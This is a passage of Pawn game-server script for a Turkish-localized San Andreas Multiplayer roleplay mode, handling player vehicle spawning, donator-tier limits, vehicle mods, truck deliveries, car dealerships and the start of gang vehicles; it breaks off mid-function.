		PlayerVehicleInfo[playerid][playervehicleid][pvColor2] = 126;
		PlayerVehicleInfo[playerid][playervehicleid][pvPrice] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvFuel] = 100.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvImpounded] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] = 0;
		LockStatus[PlayerVehicleInfo[playerid][playervehicleid][pvId]] = 0;
	    PlayerVehicleInfo[playerid][playervehicleid][pvId] = INVALID_PLAYER_VEHICLE_ID;

	    if(PlayerVehicleInfo[playerid][playervehicleid][pvAllowedplayerid] != INVALID_PLAYER_ID) {
	        PlayerInfo[PlayerVehicleInfo[playerid][playervehicleid][pvAllowedplayerid]][pVehicleKeys] = INVALID_PLAYER_VEHICLE_ID;
	        PlayerInfo[PlayerVehicleInfo[playerid][playervehicleid][pvAllowedplayerid]][pVehicleKeysFrom] = INVALID_PLAYER_ID;
	    	PlayerVehicleInfo[playerid][playervehicleid][pvAllowedplayerid] = INVALID_PLAYER_ID;
		}

		PlayerVehicleInfo[playerid][playervehicleid][pvRealID] = 0;
	}
}

stock LoadPlayerVehicles(playerid) {
	switch(PlayerInfo[playerid][pDonator]) {
		case 0: {
			PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 1;
		}
		case 1: {
            PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 1;
		}
		case 2: {
            PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 1;
        }
		case 3: {
            PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 0;
        }
        default: {
        	PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 1;
        }
	}
	for(new v = 0; v < MAX_PLAYERVEHICLES; v++) {
        if(vehicleCountCheck(playerid)) {
			if(PlayerVehicleInfo[playerid][v][pvModelId] != 0 && PlayerVehicleInfo[playerid][v][pvImpounded] == 0 && PlayerVehicleInfo[playerid][v][pvSpawned] == 1) {

				PlayerCars++;
				VehicleSpawned[playerid]++;
				new carcreated = CreateVehicle(PlayerVehicleInfo[playerid][v][pvModelId], PlayerVehicleInfo[playerid][v][pvPosX], PlayerVehicleInfo[playerid][v][pvPosY], PlayerVehicleInfo[playerid][v][pvPosZ], PlayerVehicleInfo[playerid][v][pvPosAngle],PlayerVehicleInfo[playerid][v][pvColor1], PlayerVehicleInfo[playerid][v][pvColor2], -1);
				PlayerVehicleInfo[playerid][v][pvId] = carcreated;
				//VehicleFuel[carcreated] = PlayerVehicleInfo[playerid][v][pvFuel];

				if(PlayerVehicleInfo[playerid][v][pvLocked]) {
					LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][v][pvId], PlayerVehicleInfo[playerid][v][pvLock]);
				}

				if(strlen(PlayerVehicleInfo[playerid][v][pvNumberPlate]) > 0)
					SetVehicleNumberPlate(carcreated, PlayerVehicleInfo[playerid][v][pvNumberPlate]);

				LoadPlayerVehicleMods(playerid, v);
			}
			else if(PlayerVehicleInfo[playerid][v][pvModelId] == 0 && PlayerVehicleInfo[playerid][v][pvImpounded] != 0) {
				PlayerVehicleInfo[playerid][v][pvImpounded] = 0;
			}
			else if(PlayerVehicleInfo[playerid][v][pvModelId] == 0 && PlayerVehicleInfo[playerid][v][pvSpawned] != 0) {
				PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
			}
        }
		else PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
    }
    return 1;
}

vehicleCountCheck(playerid) {
	switch(PlayerInfo[playerid][pDonator]) {
		case 0, 1: if(VehicleSpawned[playerid] >= 1) return 0;
		case 2: if(VehicleSpawned[playerid] >= 2) return 0;
		case 3: if(VehicleSpawned[playerid] >= 3) return 0;
		case 4, 5: if(VehicleSpawned[playerid] >= 5) return 0;
		default: return 0;
	}
	return 1;
}

stock UnloadPlayerVehicles(playerid)
{
    new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	for(new v = 0; v < MAX_PLAYERVEHICLES; v++)
    {
        if(PlayerVehicleInfo[playerid][v][pvId] != INVALID_PLAYER_VEHICLE_ID && PlayerVehicleInfo[playerid][v][pvImpounded] == 0)
        {
            PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
			VehicleSpawned[playerid]--;
            PlayerCars--;
            if(LockStatus[PlayerVehicleInfo[playerid][v][pvId]] != 0) LockStatus[PlayerVehicleInfo[playerid][v][pvId]] = 0;
            UpdatePlayerVehicleMods(playerid, v);
			DestroyVehicle(PlayerVehicleInfo[playerid][v][pvId]);
			VehicleRadioStation[PlayerVehicleInfo[playerid][v][pvId]] = 0;
			PlayerVehicleInfo[playerid][v][pvId] = INVALID_PLAYER_VEHICLE_ID;
			if(PlayerVehicleInfo[playerid][v][pvAllowedplayerid] != INVALID_PLAYER_ID)
	    	{
	    	    PlayerInfo[PlayerVehicleInfo[playerid][v][pvAllowedplayerid]][pVehicleKeys] = INVALID_PLAYER_VEHICLE_ID;
	    	    PlayerInfo[PlayerVehicleInfo[playerid][v][pvAllowedplayerid]][pVehicleKeysFrom] = INVALID_PLAYER_ID;
	    		PlayerVehicleInfo[playerid][v][pvAllowedplayerid] = INVALID_PLAYER_ID;
			}
        }
    }
}

stock UpdatePlayerVehicleParkPosition(playerid, playervehicleid, Float:newx, Float:newy, Float:newz, Float:newangle, Float:health)
{
    new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	if(PlayerVehicleInfo[playerid][playervehicleid][pvId] != INVALID_PLAYER_VEHICLE_ID)
	{
		 new Float:oldx, Float:oldy, Float:oldz;
		 oldx = PlayerVehicleInfo[playerid][playervehicleid][pvPosX];
		 oldy = PlayerVehicleInfo[playerid][playervehicleid][pvPosY];
		 oldz = PlayerVehicleInfo[playerid][playervehicleid][pvPosZ];
		 if(oldx == newx && oldy == newy && oldz == newz) return 0;
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosX] = newx;
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosY] = newy;
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosZ] = newz;
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle] = newangle;
		 //oldfuel = VehicleFuel[PlayerVehicleInfo[playerid][playervehicleid][pvId]];
		 //VehicleFuel[PlayerVehicleInfo[playerid][playervehicleid][pvId]] = 100.0;
		 UpdatePlayerVehicleMods(playerid, playervehicleid);
		 DestroyVehicle(PlayerVehicleInfo[playerid][playervehicleid][pvId]);
		 new carcreated = CreateVehicle(PlayerVehicleInfo[playerid][playervehicleid][pvModelId], PlayerVehicleInfo[playerid][playervehicleid][pvPosX], PlayerVehicleInfo[playerid][playervehicleid][pvPosY], PlayerVehicleInfo[playerid][playervehicleid][pvPosZ],
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle],PlayerVehicleInfo[playerid][playervehicleid][pvColor1], PlayerVehicleInfo[playerid][playervehicleid][pvColor2], -1);
         PlayerVehicleInfo[playerid][playervehicleid][pvId] = carcreated;
         //VehicleFuel[carcreated] = oldfuel;
         SetVehicleNumberPlate(carcreated, PlayerVehicleInfo[playerid][playervehicleid][pvNumberPlate]);
         SetVehicleHealth(carcreated, health);
		 if(PlayerVehicleInfo[playerid][playervehicleid][pvLocked] == 1) LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][playervehicleid][pvId], PlayerVehicleInfo[playerid][playervehicleid][pvLock]);
         LoadPlayerVehicleMods(playerid, playervehicleid);
         return 1;
	}
	return 0;
}

stock UpdatePlayerVehicleMods(playerid, playervehicleid)
{
	if(PlayerVehicleInfo[playerid][playervehicleid][pvImpounded] == 0 || PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] == 1) {
		new playername[MAX_PLAYER_NAME];
		GetPlayerName(playerid, playername, sizeof(playername));
		new carid = PlayerVehicleInfo[playerid][playervehicleid][pvId];
		new exhaust, frontbumper, rearbumper, roof, spoilers, sideskirt1,
			sideskirt2, wheels, hydraulics, nitro, hood, lamps, stereo, ventright, ventleft;
		exhaust = GetVehicleComponentInSlot(carid, CARMODTYPE_EXHAUST);
		frontbumper = GetVehicleComponentInSlot(carid, CARMODTYPE_FRONT_BUMPER);
		rearbumper = GetVehicleComponentInSlot(carid, CARMODTYPE_REAR_BUMPER);
		roof = GetVehicleComponentInSlot(carid, CARMODTYPE_ROOF);
		spoilers = GetVehicleComponentInSlot(carid, CARMODTYPE_SPOILER);
		sideskirt1 = GetVehicleComponentInSlot(carid, CARMODTYPE_SIDESKIRT);
		sideskirt2 = GetVehicleComponentInSlot(carid, CARMODTYPE_SIDESKIRT);
		wheels = GetVehicleComponentInSlot(carid, CARMODTYPE_WHEELS);
		hydraulics = GetVehicleComponentInSlot(carid, CARMODTYPE_HYDRAULICS);
		nitro = GetVehicleComponentInSlot(carid, CARMODTYPE_NITRO);
		hood = GetVehicleComponentInSlot(carid, CARMODTYPE_HOOD);
		lamps = GetVehicleComponentInSlot(carid, CARMODTYPE_LAMPS);
		stereo = GetVehicleComponentInSlot(carid, CARMODTYPE_STEREO);
		ventright = GetVehicleComponentInSlot(carid, CARMODTYPE_VENT_RIGHT);
		ventleft = GetVehicleComponentInSlot(carid, CARMODTYPE_VENT_LEFT);
		if(spoilers >= 1000)    PlayerVehicleInfo[playerid][playervehicleid][pvMods][0] = spoilers;
		if(hood >= 1000)        PlayerVehicleInfo[playerid][playervehicleid][pvMods][1] = hood;
		if(roof >= 1000)        PlayerVehicleInfo[playerid][playervehicleid][pvMods][2] = roof;
		if(sideskirt1 >= 1000)  PlayerVehicleInfo[playerid][playervehicleid][pvMods][3] = sideskirt1;
		if(lamps >= 1000)       PlayerVehicleInfo[playerid][playervehicleid][pvMods][4] = lamps;
		if(nitro >= 1000)       PlayerVehicleInfo[playerid][playervehicleid][pvMods][5] = nitro;
		if(exhaust >= 1000)     PlayerVehicleInfo[playerid][playervehicleid][pvMods][6] = exhaust;
		if(wheels >= 1000)      PlayerVehicleInfo[playerid][playervehicleid][pvMods][7] = wheels;
		if(stereo >= 1000)      PlayerVehicleInfo[playerid][playervehicleid][pvMods][8] = stereo;
		if(hydraulics >= 1000)  PlayerVehicleInfo[playerid][playervehicleid][pvMods][9] = hydraulics;
		if(frontbumper >= 1000) PlayerVehicleInfo[playerid][playervehicleid][pvMods][10] = frontbumper;
		if(rearbumper >= 1000)  PlayerVehicleInfo[playerid][playervehicleid][pvMods][11] = rearbumper;
		if(ventright >= 1000)   PlayerVehicleInfo[playerid][playervehicleid][pvMods][12] = ventright;
		if(ventleft >= 1000)    PlayerVehicleInfo[playerid][playervehicleid][pvMods][13] = ventleft;
		if(sideskirt2 >= 1000)  PlayerVehicleInfo[playerid][playervehicleid][pvMods][14] = sideskirt2;
	}
}

stock LoadPlayerVehicleMods(playerid, playervehicleid)
{
	if(PlayerVehicleInfo[playerid][playervehicleid][pvImpounded] == 0 || PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] == 1) {
		//printf(" Loading player #%d vehicle #%d mods.", playerid, playervehicleid);

		new paintjob = PlayerVehicleInfo[playerid][playervehicleid][pvPaintJob];
		new color1 = PlayerVehicleInfo[playerid][playervehicleid][pvColor1];
		new color2 = PlayerVehicleInfo[playerid][playervehicleid][pvColor2];
		if(PlayerVehicleInfo[playerid][playervehicleid][pvPaintJob] != -1)
		{
			 ChangeVehiclePaintjob(PlayerVehicleInfo[playerid][playervehicleid][pvId], paintjob);
			 ChangeVehicleColor(PlayerVehicleInfo[playerid][playervehicleid][pvId], color1, color2);
		}
		for(new m = 0; m < MAX_MODS; m++)
		{
		    if(PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] >= 1000  && PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] <= 1193)
		    {
				if(InvalidModCheck(GetVehicleModel(PlayerVehicleInfo[playerid][playervehicleid][pvId]),PlayerVehicleInfo[playerid][playervehicleid][pvMods][m]))
				{
					AddVehicleComponent(PlayerVehicleInfo[playerid][playervehicleid][pvId], PlayerVehicleInfo[playerid][playervehicleid][pvMods][m]);
				}
				else
				{
				    //printf("Removing invalid mod %d from %d of %s", PlayerVehicleInfo[playerid][playervehicleid][pvMods][m], GetVehicleModel(PlayerVehicleInfo[playerid][playervehicleid][pvId]), GetPlayerNameEx(playerid));
				    PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] = 0;
				}
			}
		}
	}
}

stock GetPlayerFreeVehicleId(playerid) {
	for(new i; i < MAX_PLAYERVEHICLES; ++i) {
		if(PlayerVehicleInfo[playerid][i][pvModelId] == 0) return i;
	}
	return -1;
}

GetPlayerVehicleCount(playerid)
{
	new cars = 0;
	for(new i = 0; i < MAX_PLAYERVEHICLES; i++) {
	    if(PlayerVehicleInfo[playerid][i][pvRealID] > 0) {
	        if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID && PlayerVehicleInfo[playerid][i][pvImpounded] == 0) {
				if(CheckPlayerVehicleForDesync(playerid, PlayerVehicleInfo[playerid][i][pvId])) return 0;
				cars++;
			}
	    }
	}
	return cars;
}

stock GetPlayerVehicleCountEx(playerid)
{
	new cars;
	for(new i = 0; i < MAX_PLAYERVEHICLES; i++) {
	    if(PlayerVehicleInfo[playerid][i][pvRealID] > 0) cars++;
	}
	return cars;
}

CheckPlayerVehicleForDesync(playerid, vehicleid)
{
	if(GetVehicleModel(vehicleid) < 400 || GetVehicleModel(vehicleid) > 611)
	{
	    //SendClientMessage(playerid, COLOR_WHITE, "A problem with your vehicles has been detected.");
	    UnloadPlayerVehicles(playerid);
	    LoadPlayerVehicles(playerid);
	    //SendClientMessage(playerid, COLOR_WHITE, "This problem has now been resolved.");
	    return 1;
	}
	return 0;
}

stock GetPlayerVehicle(playerid, vehicleid)
{
	if(!IsPlayerConnected(playerid)) return -1;
	if(!GetVehicleModel(vehicleid)) return -1;
    for(new v = 0; v < MAX_PLAYERVEHICLES; v++)
    {
        if(PlayerVehicleInfo[playerid][v][pvId] == vehicleid)
        {
            return v;
        }
    }
    return -1;
}

forward IsAtTruckDeliveryPoint(playerid);
public IsAtTruckDeliveryPoint(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 6, 812.287231, -1623.678222, 13.546875) || IsPlayerInRangeOfPoint(playerid, 6, 1204.510375, -920.674499, 43.074016) ||
	IsPlayerInRangeOfPoint(playerid, 6, 2402.169677, -1502.789306, 23.834865) || IsPlayerInRangeOfPoint(playerid, 6, 2110.254394, -1214.892578, 23.485479) ||
	IsPlayerInRangeOfPoint(playerid, 6, 1458.425292, -1140.346069, 23.938444) || IsPlayerInRangeOfPoint(playerid, 6, 500.889678, -1352.339843, 15.463395) ||
	IsPlayerInRangeOfPoint(playerid, 6, 334.012207, -1373.775146, 14.230167) || IsPlayerInRangeOfPoint(playerid, 6, 1317.785522, -870.413818, 39.089378) ||
	IsPlayerInRangeOfPoint(playerid, 6, 1342.577026, -1748.498535, 12.934987) || IsPlayerInRangeOfPoint(playerid, 6, 653.629699, -579.503051, 15.889705) ||
	IsPlayerInRangeOfPoint(playerid, 6, 1634.834716, 757.830017, 10.820312) || IsPlayerInRangeOfPoint(playerid, 6, 2833.109375, 893.754699, 10.757797) ||
	IsPlayerInRangeOfPoint(playerid, 6, -510.522918, -501.250030, 25.523437))
	{ return true; }
	return false;
}

forward CancelTruckDelivery(playerid);
public CancelTruckDelivery(playerid)
{
    new vehicleid = GetPlayerVehicleID(playerid);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(IsATruckerCar(vehicleid)) SetVehicleToRespawn(vehicleid);
	}
 	DestroyProgressBar(LoadTruckBar[playerid]);
	LoadTruckBar[playerid] = INVALID_BAR_ID;
	LoadTruckTime[playerid] = 0;
	DeletePVar(playerid, "TruckDeliver");
	TruckContents[TruckUsed[playerid]] = 0;
	TruckUsed[playerid] = INVALID_VEHICLE_ID;
	gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 	DisablePlayerCheckpoint(playerid);
	return 1;
}

stock InvalidModCheck(model, partid) {
    switch(model) {
		case 430, 446, 452, 453, 454, 472, 473, 484, 493, 595, 573, 556, 557, 539, 471, 432, 406, 444,
		448, 461, 462, 463, 468, 481, 509, 510, 521, 522, 581, 586, 417, 425, 447, 460, 469, 476, 487,
		488, 511, 512, 513, 519, 520, 548, 553, 563, 577, 592, 593: return 0;
		default: switch(GetVehicleComponentType(partid)) {
			case 5: switch(partid) {
				case 1008, 1009, 1010: return 1;
				default: return 0;
			}
			case 7: switch(partid) {
				case 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1096, 1097, 1098, 1025: return 1;
				default: return 0;
			}
			case 8: switch(partid) {
				case 1086: return 1;
				default: return 0;
			}
			case 9: switch(partid) {
				case 1087: return 1;
				default: return 0;
			}
			default: for(new i; i < 4; i++) if(partid == vehicleMods[model - 400][GetVehicleComponentType(partid)][i]) {
				return 1;
			}
		}
	}
	return 0;
}

//------------------------------------------------------------------------------
//arac DEALERSHIP SYSTEM
//------------------------------------------------------------------------------

stock CreateCarDealership(Float: enx, Float: eny, Float: enz, Float: radius, price, message[])
{
	new dealershipid = GetFreeCarDealership();
	if(dealershipid == -1) return -1;
	new text_info[128];
	CarDealershipInfo[dealershipid][cdEntranceX] = enx;
	CarDealershipInfo[dealershipid][cdEntranceY] = eny;
	CarDealershipInfo[dealershipid][cdEntranceZ] = enz;
	CarDealershipInfo[dealershipid][cdRadius] = radius;
	CarDealershipInfo[dealershipid][cdPrice] = price;
	strmid(CarDealershipInfo[dealershipid][cdMessage], message, 0, strlen(message), 255);
	CarDealershipInfo[dealershipid][cdPickupID] = CreatePickup(1272, 1, CarDealershipInfo[dealershipid][cdEntranceX], CarDealershipInfo[dealershipid][cdEntranceY], CarDealershipInfo[dealershipid][cdEntranceZ], -1);
	format(text_info, sizeof(text_info), "% arac bayisi satilik\nUcret: %d\nID: %d", CarDealershipInfo[dealershipid][cdMessage], CarDealershipInfo[dealershipid][cdPrice], dealershipid);
    CarDealershipInfo[dealershipid][cdTextLabel] = CreateDynamic3DTextLabel(text_info,COLOR_YELLOW,CarDealershipInfo[dealershipid][cdEntranceX], CarDealershipInfo[dealershipid][cdEntranceY], CarDealershipInfo[dealershipid][cdEntranceZ]+0.5,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
    SavecDealerships();
    return dealershipid;
}
stock DestroyCarDealership(dealershipid)
{
	new string[30];
	CarDealershipInfo[dealershipid][cdEntranceX] = 0.0;
	CarDealershipInfo[dealershipid][cdEntranceY] = 0.0;
	CarDealershipInfo[dealershipid][cdEntranceZ] = 0.0;
	CarDealershipInfo[dealershipid][cdRadius] = 0.0;
	CarDealershipInfo[dealershipid][cdTill] = 0;
	CarDealershipInfo[dealershipid][cdOwned] = 0;
	CarDealershipInfo[dealershipid][cdPrice] = 0;
	format(string, sizeof(string), "Yok");
	strmid(CarDealershipInfo[dealershipid][cdOwner], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Yok");
	strmid(CarDealershipInfo[dealershipid][cdMessage], string, 0, strlen(string), 255);
	DestroyDynamic3DTextLabel(CarDealershipInfo[dealershipid][cdTextLabel]);
	DestroyPickup(CarDealershipInfo[dealershipid][cdPickupID]);
	CarDealershipInfo[dealershipid][cdPickupID] = 0;
	CarDealershipInfo[dealershipid][cdTextLabel] = Text3D:INVALID_3DTEXT_ID;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][0] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawn][1] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawn][2] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawn][3] = 0.0;
	for(new v = 0; v < MAX_DEALERSHIPVEHICLES; v++)
	{
		if(CarDealershipInfo[dealershipid][cdVehicleModel][v] != 0)
		{
	        DestroyCarDealershipVehicle(dealershipid, v);
		}
	}
	SavecDealerships();
}
stock GetFreeCarDealership()
{
    new
		i = 0;
	while (i < MAX_CARDEALERSHIPS && CarDealershipInfo[i][cdEntranceX] != 0.0 && CarDealershipInfo[i][cdEntranceY] != 0.0)
	{
		i++;
	}
	if(i == MAX_CARDEALERSHIPS) return -1;
	return i;

}
stock SetPlayerOwnerOfCD(playerid, dealershipid)
{
	new owner[MAX_PLAYER_NAME];
	CarDealershipInfo[dealershipid][cdOwned] = 1;
	GetPlayerName(playerid, owner, sizeof(owner));
	strmid(CarDealershipInfo[dealershipid][cdOwner], owner, 0, strlen(owner), 255);
	new text_info[128];
	format(text_info, sizeof(text_info), "%s arac bayisi\nSahibi: %s\nID: %d", CarDealershipInfo[dealershipid][cdMessage], CarDealershipInfo[dealershipid][cdOwner], dealershipid);
	UpdateDynamic3DTextLabelText(CarDealershipInfo[dealershipid][cdTextLabel], COLOR_LIGHTBLUE, text_info);
	SavecDealerships();
}
stock SellCarDealership(dealershipid)
{
	CarDealershipInfo[dealershipid][cdOwned] = 0;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][0] = 0.0;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][1] = 0.0;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][2] = 0.0;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][3] = 0.0;
	strmid(CarDealershipInfo[dealershipid][cdOwner], "Nobody", 0, MAX_PLAYER_NAME, 255);
	new text_info[128];
	format(text_info, sizeof(text_info), "% arac bayisi satilik\nUcret: %d\nID: %d", CarDealershipInfo[dealershipid][cdMessage], CarDealershipInfo[dealershipid][cdPrice], dealershipid);
	UpdateDynamic3DTextLabelText(CarDealershipInfo[dealershipid][cdTextLabel], COLOR_RED, text_info);
	SavecDealerships();
}
stock IsPlayerOwnerOfCD(playerid)
{
	new owner[MAX_PLAYER_NAME];
	GetPlayerName(playerid, owner, sizeof(owner));
	for(new d = 0; d < MAX_CARDEALERSHIPS; d++)
    {
	    if(strcmp(CarDealershipInfo[d][cdOwner],owner, true) == 0)
	    {
			return d;
		}
	}
	return -1;
}
stock IsPlayerOwnerOfCDEx(playerid, dealershipid)
{
	new owner[MAX_PLAYER_NAME];
	GetPlayerName(playerid, owner, sizeof(owner));
	if(strcmp(CarDealershipInfo[dealershipid][cdOwner],owner, true) == 0)
	{
	    return 1;
	}
	return 0;
}
stock CreateCarDealershipVehicle(dealershipid, modelid, Float: x, Float: y, Float: z, Float: a, price)
{
    new cdvehicleid = GetFreeCarDealershipVehicleId(dealershipid);
    if(cdvehicleid == -1) return -1;
    new text_info[128];
    CarDealershipInfo[dealershipid][cdVehicleModel][cdvehicleid] = modelid;
    CarDealershipInfo[dealershipid][cdVehicleCost][cdvehicleid] = price;
    CarDealershipInfo[dealershipid][cdVehicleSpawnX][cdvehicleid] = x;
    CarDealershipInfo[dealershipid][cdVehicleSpawnY][cdvehicleid] = y;
    CarDealershipInfo[dealershipid][cdVehicleSpawnZ][cdvehicleid] = z;
    CarDealershipInfo[dealershipid][cdVehicleSpawnAngle][cdvehicleid] = a;
    new carcreated = CreateVehicle(modelid, x, y, z, a, 0, 0, 6);
    format(text_info, sizeof(text_info), "%s Satilik | Ucret: %d", GetVehicleName(carcreated), CarDealershipInfo[dealershipid][cdVehicleCost][cdvehicleid]);
    CarDealershipInfo[dealershipid][cdVehicleLabel][cdvehicleid] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,0.0, 0.0, 0.0,5.0,INVALID_PLAYER_ID,carcreated,1);
	CarDealershipInfo[dealershipid][cdVehicleId][cdvehicleid] = carcreated;
	SavecDealerships();
    return cdvehicleid;
}
stock DestroyCarDealershipVehicle(dealershipid, cdvehicleid)
{
    CarDealershipInfo[dealershipid][cdVehicleModel][cdvehicleid] = 0;
    CarDealershipInfo[dealershipid][cdVehicleCost][cdvehicleid] = 0;
    CarDealershipInfo[dealershipid][cdVehicleSpawnX][cdvehicleid] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawnY][cdvehicleid] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawnZ][cdvehicleid] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawnAngle][cdvehicleid] = 0.0;
    DestroyDynamic3DTextLabel(CarDealershipInfo[dealershipid][cdVehicleLabel][cdvehicleid]);
    DestroyVehicle(CarDealershipInfo[dealershipid][cdVehicleId][cdvehicleid]);
    VehicleRadioStation[CarDealershipInfo[dealershipid][cdVehicleId][cdvehicleid]] = 0;
    CarDealershipInfo[dealershipid][cdVehicleLabel][cdvehicleid] = Text3D:INVALID_3DTEXT_ID;
    CarDealershipInfo[dealershipid][cdVehicleId][cdvehicleid] = 0;
}
stock GetFreeCarDealershipVehicleId(dealershipid)
{
    new
		i = 0;
	while (i < MAX_DEALERSHIPVEHICLES && CarDealershipInfo[dealershipid][cdVehicleModel][i] != 0)
	{
		i++;
	}
	if(i == MAX_DEALERSHIPVEHICLES) return -1;
	return i;

}
stock GetCarDealershipVehicleId(vehicleid)
{
    for(new d = 0; d < MAX_CARDEALERSHIPS; d++)
    {
        for(new v = 0; v < MAX_DEALERSHIPVEHICLES; v++)
        {
            if(CarDealershipInfo[d][cdVehicleId][v] == vehicleid)
            {
                return v;
            }
		}
    }
    return -1;
}
stock GetCarDealershipId(vehicleid)
{
    for(new d = 0; d < MAX_CARDEALERSHIPS; d++)
    {
        for(new v = 0; v < MAX_DEALERSHIPVEHICLES; v++)
        {
            if(CarDealershipInfo[d][cdVehicleId][v] == vehicleid)
            {
                return d;
            }
		}
    }
    return -1;
}

//------------------------------------------------------------------------------
//----------------------DYNAMIC GANG VEHICLE SYSTEM-----------------------------
//------------------------------------------------------------------------------

LockGangVehicle(family, carid, type)
{
	new v = GetGangVehicle(family, carid);
	if(FamilyVehicleInfo[family][v][fvId] == carid && type == 2)
	{
	    LockStatus[carid] = 1;
		vehicle_lock_doors(carid);
	}
}

UnLockGangVehicle(family, carid, type)
{
	new v = GetGangVehicle(family, carid);
	if(FamilyVehicleInfo[family][v][fvId] == carid && type == 2)
	{
	    LockStatus[carid] = 0;
		vehicle_unlock_doors(carid);
	}
}

stock CreateGangVehicle(f, fv, modelid, Float: x, Float: y, Float: z, Float: angle, color1, color2, price)
{
	if(FamilyVehicleInfo[f][fv][fvId] == INVALID_VEHICLE_ID)
	{
		FamilyVehicleInfo[f][fv][fvModelId] = modelid;
		FamilyVehicleInfo[f][fv][fvSpawnx] = x;
		FamilyVehicleInfo[f][fv][fvSpawny] = y;
		FamilyVehicleInfo[f][fv][fvSpawnz] = z;
		FamilyVehicleInfo[f][fv][fvSpawna] = angle;
		FamilyVehicleInfo[f][fv][fvColor1] = color1;
		FamilyVehicleInfo[f][fv][fvColor2] = color2;
		FamilyVehicleInfo[f][fv][fvPrice] = price;
		FamilyVehicleInfo[f][fv][fvFuel] = 100.0;
		new carcreated = CreateVehicle(modelid,x,y,z,angle,color1,color2,-1);
		LockStatus[carcreated] = 0;
		FamilyVehicleInfo[f][fv][fvId] = carcreated;
